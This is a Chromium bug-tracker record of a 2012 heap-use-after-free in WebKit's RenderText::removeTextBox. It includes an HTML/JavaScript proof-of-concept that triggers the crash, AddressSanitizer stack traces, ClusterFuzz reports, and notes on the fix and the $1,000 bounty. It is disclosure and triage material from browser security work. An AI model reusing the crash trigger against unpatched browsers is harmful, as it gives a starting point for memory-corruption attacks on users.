# Heap-use-after-free in WebCore::RenderText::removeTextBox

| Field | Value |
|-------|-------|
| **Issue ID** | [40055855](https://issues.chromium.org/issues/40055855) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | mi...@gmail.com |
| **Assignee** | ke...@chromium.org |
| **Created** | 2012-03-29 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**

use-after-free in WebCore::RenderText::removeTextBox

**VERSION**  

Chrome Version: stable, beta, dev

Chromium 19.0.1085.0 (Developer Build 129583)  

OS Linux  

WebKit 536.5 (@112458)

Operating System: 64bit linux

**REPRODUCTION CASE**

<html>
<head>
<style>
#el0 {
-webkit-column-count:2;
display: table-cell;
}
#el0::first-letter {
background-size: auto;
}
#el1 {
float: right;
}
</style>
<script>
onload = function() {
el0=document.createElement('div')
el0.setAttribute('id','el0')
document.body.appendChild(el0)
el1=document.createElement('div')
el1.setAttribute('id','el1')
el0.appendChild(el1)
el0.appendChild(document.createTextNode(unescape('%u3200A')))
document.designMode='on'
window.getSelection().setBaseAndExtent(el1, 0, el1, 0)
document.execCommand('InsertLineBreak')
document.execCommand('selectall')
document.execCommand('strikethrough')
document.execCommand('FormatBlock', false, '<'+'pre>')
}
</script>
</head>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer + asan  

Crash State:

==32492== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffe761d5c0 at pc 0x55555ad105b7 bp 0x7fffffff3020 sp 0x7fffffff3018  

READ of size 8 at 0x7fffe761d5c0 thread T0  

#0 0x55555ad105b7 in WebCore::RenderText::removeTextBox(WebCore::InlineTextBox\*) ???:0  

#1 0x55555aa1ce29 in WebCore::InlineTextBox::deleteLine(WebCore::RenderArena\*) ???:0  

#2 0x55555aa04e8d in WebCore::InlineFlowBox::deleteLine(WebCore::RenderArena\*) ???:0

0x7fffe761d5c0 is located 64 bytes inside of 96-byte region [0x7fffe761d580,0x7fffe761d5e0)  

freed by thread T0 here:  

#0 0x55555de50f32 in free ??:0  

#1 0x55555aa8e3c9 in WebCore::RenderBlock::createFirstLetterRenderer(WebCore::RenderObject\*, WebCore::RenderObject\*) ???:0  

#2 0x55555aa8f0c6 in WebCore::RenderBlock::updateFirstLetter() ???:0  

#3 0x55555aa43e02 in WebCore::RenderBlock::layout() ???:0

## Attachments

- [beta-6496.txt](attachments/beta-6496.txt) (text/plain; charset=us-ascii, 13.7 KB)
- [stable-6496.txt](attachments/stable-6496.txt) (text/plain; charset=us-ascii, 13.7 KB)
- [6496.html](attachments/6496.html) (text/html; charset=us-ascii, 923 B)
- [6496.txt](attachments/6496.txt) (text/plain; charset=us-ascii, 13.8 KB)

## Timeline

### ke...@chromium.org (2012-03-30)

I can see this on trunk in a debugger, though it's tricky because it looks to me like the memory is getting reallocated before use (so it actually shows to me as a bad cast, but it's more likely a use after free).

I have not been able to verify on stable or beta (it doesn't crash for me and I don't have ASAN builds). I'm flagging based on the provided stack traces for those.

Looks like cluster-fuzz is not showing this for some reason?

### ke...@chromium.org (2012-03-30)

Scratch that... it just reproduced on CF. I'll attach the test case as soon as the regression range is provided.

### ke...@chromium.org (2012-03-30)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=32105509

Uploader: kenrb@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7f5bb5af96c0
Crash State:
  - crash stack -
  WebCore::RenderText::removeTextBox
  WebCore::InlineTextBox::deleteLine
  - free stack -
  WebCore::RenderBlock::createFirstLetterRenderer
  WebCore::RenderBlock::updateFirstLetter
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=112953:112954

Minimized Testcase (0.90 Kb): https://cluster-fuzz.appspot.com/download/AMIfv96EzTntiugalR5zGUxbJtbyaRJk-r5kiAR2I0Ke31sqkQJ4ZwpCJUvXBPzTx8jAG_V4fa7v-T7yjaurgwBRFzgw0K_5hDSW9SR61gbSAVqFfA6NbXK0fkD_JimJQ4p8uq6DpwgogLgwVrANb1zb8W5Y1C66EA

### ke...@chromium.org (2012-03-30)

Regression range isn't correct.

### in...@chromium.org (2012-03-30)

The repro is not reliable which looks be the reason it wasnt reproducing first in c#1.

### in...@chromium.org (2012-04-01)

I made the repro reliable for CF. report coming.

### in...@chromium.org (2012-04-01)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=32408814

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7ff469bd8ec0
Crash State:
  - crash stack -
  WebCore::RenderText::removeTextBox
  WebCore::InlineTextBox::deleteLine
  - free stack -
  WebCore::RenderBlock::createFirstLetterRenderer
  WebCore::RenderBlock::updateFirstLetter
  

Minimized Testcase (0.88 Kb): https://cluster-fuzz.appspot.com/download/AMIfv95U06HC2vo6q7QMMBefFCIcXurvUoyhfrYLK_pD8f70LvOdOMD8oiAi0_h6kBQq242sg46hWlOnbvjVao6eUi3DTfCS8vNtp-XW5BfBkPFX4WzbqRyH4VIBcUhD5WVDkbyGtbnaoZEJ-wVq6NUccCBKh8vqRg

### in...@chromium.org (2012-04-01)

Miaubiz, if any of your repros require pressing the refresh button, please do add a location.reload() at end of your repro in the future.

### mi...@gmail.com (2012-04-01)

is it ok if I add location.reload() to everything just in case? It's not the refresh button which triggers but trying it n-times helps with the flakiness, right? it works 100% on my box (tm) :D

### in...@chromium.org (2012-04-01)

If location.reload() helps to reduce flakiness, then yes. Otherwise, if your repro is 100% reliable without it, then please don't add it.

### mi...@gmail.com (2012-04-01)

I have no way to tell how it will behave on CF. :(

### ke...@chromium.org (2012-05-10)

[Empty comment from Monorail migration]

### ke...@chromium.org (2012-05-10)

Upstream: https://bugs.webkit.org/show_bug.cgi?id=86133

### in...@chromium.org (2012-05-16)

m19 is out, moving milestone m18 bugs to m19.

### in...@chromium.org (2012-05-16)

http://trac.webkit.org/changeset/117309

### cl...@chromium.org (2012-05-18)

ClusterFuzz has detected this issue as fixed in range 137694:137702.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=32408814

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7ff469bd8ec0
Crash State:
  - crash stack -
  WebCore::RenderText::removeTextBox
  WebCore::InlineTextBox::deleteLine
  - free stack -
  WebCore::RenderBlock::createFirstLetterRenderer
  WebCore::RenderBlock::updateFirstLetter
  
Fixed: https://cluster-fuzz.appspot.com/revisions?range=137694:137702

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv95U06HC2vo6q7QMMBefFCIcXurvUoyhfrYLK_pD8f70LvOdOMD8oiAi0_h6kBQq242sg46hWlOnbvjVao6eUi3DTfCS8vNtp-XW5BfBkPFX4WzbqRyH4VIBcUhD5WVDkbyGtbnaoZEJ-wVq6NUccCBKh8vqRg

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### sc...@gmail.com (2012-05-22)

M19: http://trac.webkit.org/changeset/117875
M20: http://trac.webkit.org/changeset/117876

### sc...@gmail.com (2012-05-23)

Thank you miaubiz. Textbook UAF, $1000

### sc...@gmail.com (2012-05-23)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-07-09)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### js...@chromium.org (2012-12-20)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/120912?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40055855)*
